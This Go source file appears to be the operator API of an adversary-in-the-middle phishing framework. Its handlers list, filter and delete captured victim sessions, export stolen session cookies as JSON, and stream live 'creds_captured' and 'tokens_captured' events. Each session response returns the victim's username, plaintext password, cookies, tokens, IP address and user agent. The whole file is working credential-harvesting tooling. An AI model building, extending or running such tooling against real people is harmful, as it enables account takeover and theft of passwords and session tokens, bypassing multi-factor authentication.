package api

import (
	"encoding/json"
	"net/http"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

func (r *Router) listSessions(w http.ResponseWriter, req *http.Request) {
	q := req.URL.Query()
	limit, offset := parsePagination(req)

	filter := aitm.SessionFilter{
		Phishlet: q.Get("phishlet"),
		Limit:    limit,
		Offset:   offset,
	}
	if q.Get("completed") == "true" {
		filter.CompletedOnly = true
	} else if q.Get("completed") == "false" {
		filter.IncompleteOnly = true
	}
	if s := q.Get("since"); s != "" {
		if t, err := time.Parse(time.RFC3339, s); err == nil {
			filter.After = t
		}
	}
	if s := q.Get("until"); s != "" {
		if t, err := time.Parse(time.RFC3339, s); err == nil {
			filter.Before = t
		}
	}

	sessions, err := r.sessions.List(filter)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error(), "INTERNAL_ERROR")
		return
	}

	// Total count without pagination.
	all, _ := r.sessions.List(aitm.SessionFilter{
		Phishlet:       filter.Phishlet,
		CompletedOnly:  filter.CompletedOnly,
		IncompleteOnly: filter.IncompleteOnly,
		After:          filter.After,
		Before:         filter.Before,
	})

	items := make([]SessionResponse, len(sessions))
	for i, s := range sessions {
		items[i] = sessionToResponse(s)
	}
	writeJSON(w, http.StatusOK, PaginatedResponse[SessionResponse]{
		Items:  items,
		Total:  len(all),
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) getSession(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	sess, err := r.sessions.Get(id)
	if err != nil {
		status, code := errStatus(err)
		writeError(w, status, "session not found", code)
		return
	}
	writeJSON(w, http.StatusOK, sessionToResponse(sess))
}

func (r *Router) deleteSession(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.sessions.Delete(id); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (r *Router) exportSessionCookies(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	data, err := r.sessions.ExportCookiesJSON(id)
	if err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(data)
}

func (r *Router) streamSessions(w http.ResponseWriter, req *http.Request) {
	sse, ok := newSSEWriter(w)
	if !ok {
		writeError(w, http.StatusInternalServerError, "streaming not supported", "INTERNAL_ERROR")
		return
	}

	chCreated := r.bus.Subscribe(aitm.EventSessionCreated)
	chCreds := r.bus.Subscribe(aitm.EventCredsCaptured)
	chTokens := r.bus.Subscribe(aitm.EventTokensCaptured)
	chCompleted := r.bus.Subscribe(aitm.EventSessionCompleted)
	defer func() {
		r.bus.Unsubscribe(aitm.EventSessionCreated, chCreated)
		r.bus.Unsubscribe(aitm.EventCredsCaptured, chCreds)
		r.bus.Unsubscribe(aitm.EventTokensCaptured, chTokens)
		r.bus.Unsubscribe(aitm.EventSessionCompleted, chCompleted)
	}()

	sse.WriteEvent("connected", []byte(`{"status":"connected"}`))

	ctx := req.Context()
	for {
		select {
		case <-ctx.Done():
			return
		case e := <-chCreated:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.created", data) != nil {
					return
				}
			}
		case e := <-chCreds:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.creds_captured", data) != nil {
					return
				}
			}
		case e := <-chTokens:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.tokens_captured", data) != nil {
					return
				}
			}
		case e := <-chCompleted:
			if sess, ok := e.Payload.(*aitm.Session); ok {
				data, _ := json.Marshal(sessionToResponse(sess))
				if sse.WriteEvent("session.completed", data) != nil {
					return
				}
			}
		}
	}
}

func sessionToResponse(s *aitm.Session) SessionResponse {
	cookies := make(map[string]map[string]string)
	for domain, byName := range s.CookieTokens {
		cookies[domain] = make(map[string]string)
		for name, tok := range byName {
			cookies[domain][name] = tok.Value
		}
	}
	return SessionResponse{
		ID:           s.ID,
		Phishlet:     s.Phishlet,
		LureID:       s.LureID,
		RemoteAddr:   s.RemoteAddr,
		UserAgent:    s.UserAgent,
		JA4Hash:      s.JA4Hash,
		BotScore:     s.BotScore,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		CookieTokens: cookies,
		BodyTokens:   s.BodyTokens,
		HTTPTokens:   s.HTTPTokens,
		StartedAt:    s.StartedAt,
		CompletedAt:  s.CompletedAt,
	}
}
